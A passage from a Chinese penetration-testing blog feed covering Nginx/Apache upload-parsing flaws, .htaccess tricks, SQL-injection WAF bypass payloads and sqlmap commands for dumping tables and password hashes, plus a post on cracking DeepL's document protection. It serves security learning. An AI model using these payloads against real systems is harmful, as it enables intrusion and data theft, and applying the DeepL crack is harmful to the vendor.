%00空字节代码解析漏洞</h3><blockquote><p>原理：Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问<code>xxx.jpg%00.php</code>来执行其中的代码</p></blockquote><p>在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问<code>xxx.jpg%00.php</code>来执行其中的代码，此时，会把<code>xxx.jpg</code>文件当作php来执行。</p><blockquote><p>Nginx 0.5.*</p><p>Nginx 0.6.*</p><p>Nginx 0.7 &lt;= 0.7.65</p><p>Nginx 0.8 &lt;= 0.8.37</p></blockquote><h3 id="cve-2013-45472000-跟畸形漏洞好像啊"><a class="markdownIt-Anchor" href="#cve-2013-45472000-跟畸形漏洞好像啊"></a> CVE-2013-4547(%20%00)  //跟畸形漏洞好像啊</h3><blockquote><p>影响nginx版本：nginx 0.8.41 ~ 1.5.6.</p><p>这一漏洞的原理是<strong>非法字符空格</strong>和<strong>截止符（%00）<strong>会导致Nginx解析URI时的有限状态机混乱，危害是</strong>允许攻击者通过一个非编码空格绕过后缀名限制</strong>。</p><p>即：假设服务器上存在文件：<code>file.jpg(空格)</code> ，注意文件名的最后一个字符是空格。则可以通过访问：<code>http://127.0.0.1/file.jpg \0.php </code>让Nginx认为文件<code>file.jpg(空格)</code>的后缀为<code>.php</code>。</p></blockquote><p>上传一个<code>test.jpg(空格)</code>，然后访问它，因为访问时URL编码会将空格变成<code>%20</code>，所以访问的实际内容是<code>test.jpg%20</code>，不存在，那么我们访问<code>test.jpgAAAphp</code>，通过BP抓包，然后将三个A的ASCII分别改成：<code>20  00  2e(这个翻译过来就是 点)</code>。即我们访问的是有空格的php文件。但是<code>Access denied</code>，因为PHP的设置让我们没办法执行这个PHP文件代码（因为它不是php后缀），<code>security.limit_extensions</code>的存在，导致我们并不能利用此漏洞（跟畸形漏洞一个解释）。</p><h2 id="apache解析漏洞"><a class="markdownIt-Anchor" href="#apache解析漏洞"></a> Apache解析漏洞</h2><h3 id="文件名解析漏洞"><a class="markdownIt-Anchor" href="#文件名解析漏洞"></a> 文件名解析漏洞</h3><p>从右往左解析，遇到不能执行的就继续向左解析，直到可以运行解析到可识别后缀</p><h3 id="罕见后缀"><a class="markdownIt-Anchor" href="#罕见后缀"></a> 罕见后缀</h3><p>上面的黑名单很多都是罕见的</p><h3 id="htaccess文件与httpdconf文件"><a class="markdownIt-Anchor" href="#htaccess文件与httpdconf文件"></a> htaccess文件与httpd.conf文件</h3><blockquote><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过 .htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 httpd.conf 文件中配置。</p><p>httpd.conf 和 .htaccess 用于配置 Apache Web 服务器（稍后我们将讨论它们之间的相同点和不同点）。另一方面，php.ini 用于配置 PHP 运行时，允许您在其上执行动态 Web 应用程序的 PHP 代码。</p><p>httpd.conf 和 .htaccess 都是 Apache Web 服务器的基于文本的配置文件。 httpd.conf 中的配置适用于整个服务器，而 htaccess 中的配置仅适用于它所在的文件夹（及其所有子文件夹）。</p><p>httpd.conf 文件在服务器启动时读取。当您对其进行更改时，您需要重新启动 Apache。另一方面，.htaccess 文件在每次 HTTP 请求时都会被读取，因此对它们的更改不需要重新启动服务器。</p></blockquote><p>生效的前提：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mod_rewrite 模块开启</span><br><span class="line">AllowOverride All(默认为None)</span><br></pre></td></tr></table></figure><p>常见：</p><ol><li><p>把所有名字里面带有shell的文件当成php脚本来执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell.jpg&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li><li><p>让<code>.jpg</code>后缀名文件格式的文件名以php格式解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure></li></ol><p>问题：</p><ol><li>如果配置错误会出现错误：<code>Internal Server Error</code></li><li>图片木马出现：<code>Parse error: syntax error, unexpected ')' in /var/www/html/upload/piccreate_muma.jpg on line 14</code></li></ol><h1 id="漏洞修复中间件cve其他漏洞"><a class="markdownIt-Anchor" href="#漏洞修复中间件cve其他漏洞"></a> 漏洞修复（中间件/CVE/其他漏洞）</h1><h2 id="编辑器漏洞"><a class="markdownIt-Anchor" href="#编辑器漏洞"></a> 编辑器漏洞</h2><p>这个编辑器就是网页的那种编辑器，例如有的网站有编辑器，使用第三方，然后对音频、文字进行处理。<strong>大多数网页编辑器的漏洞都是上传漏洞！</strong></p><blockquote><p>手册：<a href="https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1">https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1</a></p></blockquote><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><img src="/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/image-20230529214313805.png" alt="image-20230529214313805" style="zoom:67%;" /><p>需要知道两个点：</p><ol><li>使用了什么编辑器（名字+版本）</li><li>知道编辑器的路径</li></ol><p>然后：</p><p>在网上查exp，在本地执行，使用它的脚本攻击这个网站</p><p>那么，怎么知道使用了什么编辑器？</p><ol><li>网站扫描</li><li>在后台看插件</li></ol><h2 id="cms上传"><a class="markdownIt-Anchor" href="#cms上传"></a> CMS上传</h2><p>通达OA：当发现一个OA系统，搜索他有什么漏洞，然后根据exp运行就好。会有很多方案，例如先上传后通过文件包含来运行。</p><h1 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h1><ol><li>不要暴露上传文件的位置</li><li>禁用上传文件的执行权限</li><li>黑白名单</li><li>对上传的文件重命名，不易被猜测</li><li>对文件内容进行二次渲染</li><li>对上传的内容进行读取检查</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#文件上传基础&quot;&gt;&lt;/a&gt; 文件上传基础&lt;/h1&gt;
&lt;img src=&quot;/images/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="文件上传" scheme="https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>一些有用的破解—日常篇</title>
    <link href="https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/"/>
    <id>https://j3f5.github.io/articles/2023/05/25/%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E7%A0%B4%E8%A7%A3%E2%80%94%E6%97%A5%E5%B8%B8%E7%AF%87/</id>
    <published>2023-05-25T00:56:16.000Z</published>
    <updated>2023-05-25T01:02:10.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="deepl-pro"><a class="markdownIt-Anchor" href="#deepl-pro"></a> Deepl pro</h1><h2 id="破解翻译后的docx文档只读"><a class="markdownIt-Anchor" href="#破解翻译后的docx文档只读"></a> 破解翻译后的docx文档只读</h2><p>问题描述：使用DeepL翻译出来的文档是只读模式，显示不订阅pro版本之前都是不能编辑。</p><p>解决方法：将文档<strong>另存为</strong>.xml文档，然后右键用记事本打开，CTRL+F查找：<code>&lt;w:documentProtection</code>,，找到之后，有两种方法：</p><ol><li>删除这一段完整标签<code>&gt;</code>，保存，之后修改文档后缀名为.doc，打开之后发现文档已经可以编辑了。</li><li>找到Protection后 w:enforcement=“1” 改为 w:enforcement=“0” 重命名为.doc 就OK了</li></ol><h2 id="破解网页版5000字限制"><a class="markdownIt-Anchor" href="#破解网页版5000字限制"></a> 破解网页版5000字限制</h2><p>看：<a href="https://github.com/blueagler/DeepL-Crack">https://github.com/blueagler/DeepL-Crack</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;deepl-pro&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#deepl-pro&quot;&gt;&lt;/a&gt; Deepl pro&lt;/h1&gt;
&lt;h2 id=&quot;破解翻译后的docx文档只读&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h</summary>
      
    
    
    
    <category term="杂" scheme="https://j3f5.github.io/categories/%E6%9D%82/"/>
    
    
    <category term="破解" scheme="https://j3f5.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入进阶-WAF绕过与SQLMAP工具的使用</title>
    <link href="https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://j3f5.github.io/articles/2023/05/24/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-05-24T06:46:22.000Z</published>
    <updated>2023-05-25T01:16:01.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="waf绕过"><a class="markdownIt-Anchor" href="#waf绕过"></a> WAF绕过</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-WAF%E7%BB%95%E8%BF%87%E4%B8%8ESQLMAP%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/2265061-20210117093551599-1187533368.png" alt="img" style="zoom:67%;" /><h2 id="waf识别与waf策略"><a class="markdownIt-Anchor" href="#waf识别与waf策略"></a> WAF识别与WAF策略</h2><p>这里不详细说，简单提一下：<strong>项目：<a href="https://github.com/EnableSecurity/wafw00f">wafw00f</a></strong></p><p>To do its magic, WAFW00F does the following:</p><ul><li>Sends a <em>normal</em> HTTP request and analyses the response; this identifies a number of WAF solutions.（发送HTTP包，并且分析包中的特征，来判断，这可以判断一大批）</li><li>If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is. 如果不成功，将发送许多(可能是恶意的)HTTP请求，并使用简单的逻辑来推断它是哪个WAF</li><li>If that is also not successful, it analyses the responses previously returned and uses another simple algorithm to guess if a WAF or security solution is actively responding to our attacks. 如果这也不成功，它将分析先前返回的响应，并使用另一种简单算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。</li></ul><h3 id="waf策略"><a class="markdownIt-Anchor" href="#waf策略"></a> WAF策略</h3><p>WAF针对SQL注入攻击的检测原理是检测SQL关键字、特殊符号、运算符、操作符、注释符的相关组合特征，并进行匹配。</p><ul><li>SQL关键字（如 <code>union，Select，from，as，asc，desc，order by，sort，and ，or，load，delete，update，execute，count，top，between，declare，distinct，distinctrow，sleep，waitfor，delay，having，sysdate，when，dba_user，case，delay </code>等）</li><li>特殊符号（<code>’”,; ()</code>）</li><li>运算符（<code>±*/%|</code>）</li><li>操作符（<code>=，&gt;,&lt;,&gt;=,&lt;=,!=,+=,-=</code>）</li><li>注释符（<code>–，/**/</code>）</li></ul><h2 id="数据绕过"><a class="markdownIt-Anchor" href="#数据绕过"></a> 数据绕过</h2><p>除了上图提到的简单的这里不解释了（大小写、双写嵌入等）</p><h3 id="关键字绕过"><a class="markdownIt-Anchor" href="#关键字绕过"></a> 关键字绕过</h3><ol><li><p>大小写、双写嵌入</p></li><li><p>堆叠注入，绕过select等</p></li><li><p>注释符绕过：</p><p>常用：<code>//，-- , /**/, #, --+, -- -, ;,%00,--a</code>，绕过：<code>Uni/**/on</code></p></li><li><p>等价函数绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">=</span><span class="operator">&amp;&amp;</span>  <span class="keyword">or</span><span class="operator">=</span><span class="operator">||</span>   xor<span class="operator">=</span><span class="operator">|</span>   <span class="keyword">not</span><span class="operator">=</span><span class="operator">!</span></span><br><span class="line"></span><br><span class="line"># 比较符号（<span class="operator">&lt;&gt;</span>）绕过</span><br><span class="line"># 使用greatest()、least()</span><br><span class="line"># 使用<span class="keyword">between</span> <span class="keyword">and</span>。注：<span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>; 等价于 <span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">hex()、bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line"># 举例：<span class="built_in">substring</span>()和substr()无法使用时：?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>　</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><h3 id="绕过符号"><a class="markdownIt-Anchor" href="#绕过符号"></a> 绕过符号</h3><h4 id="逗号"><a class="markdownIt-Anchor" href="#逗号"></a> 逗号</h4><p>使用from或者offset。</p><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>使用join：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>     #等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b</span><br></pre></td></tr></table></figure><p>使用like：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">80</span>   #等价于</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure><p>重点：对于<code>limit</code>可以使用<code>offset</code>来绕过：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 等价于下面这条<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="空格"><a class="markdownIt-Anchor" href="#空格"></a> 空格</h4><ul><li><p>用tab代替空格，或者用其他空格符<code>%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/</code></p></li><li><p>使用浮点数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">8.0</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>括号绕过：</p><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">and</span>(sleep(ascii(mid(database()<span class="keyword">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">1</span>)))<span class="operator">=</span><span class="number">109</span>))<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="等于号"><a class="markdownIt-Anchor" href="#等于号"></a> 等于号</h4><ul><li><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p></li><li><p>between 1 and 1; 等价于 =1</p></li></ul><h4 id="引号"><a class="markdownIt-Anchor" href="#引号"></a> 引号</h4><ul><li><p>宽字节/二次编码注入</p></li><li><p><strong>编码绕过</strong>（用于编译一个字符串，例如查询 <code>id='users'</code>，则可以编译成<code>id=0x0x7573657273</code>十六进制）</p><p>通用绕过（编码）非关键字字符串</p><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：<code>or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</code></p></li></ul><h3 id="http参数污染"><a class="markdownIt-Anchor" href="#http参数污染"></a> HTTP参数污染</h3><p>HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。</p><h4 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h4><p>在跟服务器交互的过程中，http允许get或者post多次传同一个参数，造成覆盖从而绕过waf的效果。也就是http协议允许同样的名称的参数出现多次，但是不同服务器的处理方式会不一样。</p><table><thead><tr><th style="text-align:left">Web服务器</th><th style="text-align:left">参数获取函数</th><th style="text-align:left">获取到的参数</th></tr></thead><tbody><tr><td style="text-align:left">PHP/Apache</td><td style="text-align:left">$_GET(“par”)</td><td style="text-align:left">Last</td></tr><tr><td style="text-align:left">JSP/Tomcat</td><td style="text-align:left">Request.getParameter(“par”)</td><td style="text-align:left">First</td></tr><tr><td style="text-align:left">Perl(CGI)/Apache</td><td style="text-align:left">Param(“par”)</td><td style="text-align:left">First</td></tr><tr><td style="text-align:left">Python/Apache</td><td style="text-align:left">getvalue(“par”)</td><td style="text-align:left">All(list)</td></tr><tr><td style="text-align:left">ASP/IIS</td><td style="text-align:left">Request.QueryString(“par”)</td><td style="text-align:left">ALL(comma-delimited string)</td></tr></tbody></table><h4 id="绕过"><a class="markdownIt-Anchor" href="#绕过"></a> 绕过</h4><p>waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容</p><p>我们的后端是apache，那么我们只要将参数放在后面即可</p><p>注入样例：<code>bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3</code></p></li></ol><h2 id="waf逻辑层绕过"><a class="markdownIt-Anchor" href="#waf逻辑层绕过"></a> WAF逻辑层绕过</h2><h3 id="逻辑问题"><a class="markdownIt-Anchor" href="#逻辑问题"></a> 逻辑问题</h3><ol><li><p>云waf防护，一般我们会尝试查找真实站点的真实ip，从而绕过CDN防护</p></li><li><p>当提交，GET，POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入，可尝试bypass</p></li><li><p>http和https同时开放服务，没有做http到https的强制跳转，导致https有waf防护，http没有防护，直接访问http站点绕过防护</p></li><li><p>特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害输入，从而导致bypass</p><p>比如：<code>id=1%00and 1=2 union select 1,2,column_name from imformation_schema.columns </code></p></li></ol><h3 id="性能问题"><a class="markdownIt-Anchor" href="#性能问题"></a> 性能问题</h3><p>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p><p>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p><p><strong>例子：</strong></p><p><code>?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</code></p><blockquote><p>PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</p></blockquote><h3 id="白名单"><a class="markdownIt-Anchor" href="#白名单"></a> 白名单</h3><h4 id="ip白名单"><a class="markdownIt-Anchor" href="#ip白名单"></a> IP白名单</h4><p>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。</p><p>测试方法：修改http的header来bypasswaf</p><blockquote><p>X-forwarded-for</p><p>X-remote-IP</p><p>X-originating-IP</p><p>x-remote-addr</p><p>X-Real-ip</p></blockquote><h4 id="静态资源"><a class="markdownIt-Anchor" href="#静态资源"></a> 静态资源</h4><p>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测</p><p>效率，不去检测这样一些静态文件名后缀的请求。</p><blockquote><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a></p><p><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p></blockquote><p>备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><h4 id="url白名单"><a class="markdownIt-Anchor" href="#url白名单"></a> url白名单</h4><p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</p><h2 id="各种数据库的特殊绕过"><a class="markdownIt-Anchor" href="#各种数据库的特殊绕过"></a> 各种数据库的特殊绕过</h2><p>参考：<a href="https://www.cnblogs.com/SnowSec/p/14288249.html">https://www.cnblogs.com/SnowSec/p/14288249.html</a></p><h1 id="sqlmap"><a class="markdownIt-Anchor" href="#sqlmap"></a> SQLMAP</h1><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><p><strong>检查注入点</strong></p><ul><li><p><strong>GET</strong>：<code>sqlmap -u http://192.168.208.1:49154/Less-5/?id=1</code></p></li><li><p><strong>POST</strong>：</p><ul><li><p><code>sqlmap -u http://192.168.208.1:49154/Less-5/ --data=&quot;uname=1&amp;passwd=1&amp;submit=Submit&quot;</code></p></li><li><p><code>sqlmap -r post.txt</code></p></li></ul></li></ul><p><strong>（当前用户下的所有）数据库（–dbs）</strong></p><ul><li><p><code>sqlmap -r post.txt --dbs -v 3</code></p></li><li><p><strong>获取当前数据库名：<code>--current-db</code></strong></p></li></ul><p><strong>查询表（先通过-D指定数据库）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security --tables</span><br></pre></td></tr></table></figure><p><strong>查询列名（先通过-D指定数据库 -T指定表名）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security -T users --columns</span><br></pre></td></tr></table></figure><p><strong>脱库（先通过-D指定数据库 -T指定表名）</strong></p><ul><li><strong>-C指定列名 然后–dump</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security -T users -C username --dump</span><br></pre></td></tr></table></figure><ul><li>直接全部脱出来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 -D security -T users --dump</span><br></pre></td></tr></table></figure><p><strong>获取系统信息</strong></p><ul><li><strong>数据库的用户与密码</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -v 3 --users</span><br><span class="line">sqlmap -r post.txt -v 3 --passwords</span><br></pre></td></tr></table></figure><ul><li><strong>获取当前用户名：<code>--current-user</code></strong></li></ul><p>​然后去cmd5里查询类型为mysql5的哈希密文，破解即可</p><p><strong><code>--is-dba</code>：当前用户是否为管理权限</strong></p><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~/tmpdir]</span><br><span class="line">└─$ sqlmap -r post.txt -v 3 --is-dba</span><br><span class="line">[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20),0x7171707071),NULL#</span><br><span class="line">[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,JSON_ARRAYAGG(CONCAT_WS(0x697564697a67,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))),0x7171707071),NULL#</span><br><span class="line">[11:03:25] [PAYLOAD] 1&#x27; UNION ALL SELECT CONCAT(0x7178707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x7171707071),NULL#</span><br><span class="line">[11:03:25] [DEBUG] performed 2 queries in 0.03 seconds</span><br><span class="line">current user is DBA: True</span><br></pre></td></tr></table></figure><p>这个payload是可以学习的</p><p><strong><code>--roles</code>：列出数据库管理员角色</strong></p><h2 id="执行命令"><a class="markdownIt-Anchor" href="#执行命令"></a> 执行命令</h2><h3 id="运行自定义sql语句"><a class="markdownIt-Anchor" href="#运行自定义sql语句"></a> 运行自定义sql语句</h3><p>运行<code>--sql-shell</code></p><h3 id="运行操作系统命令"><a class="markdownIt-Anchor" href="#运行操作系统命令"></a> 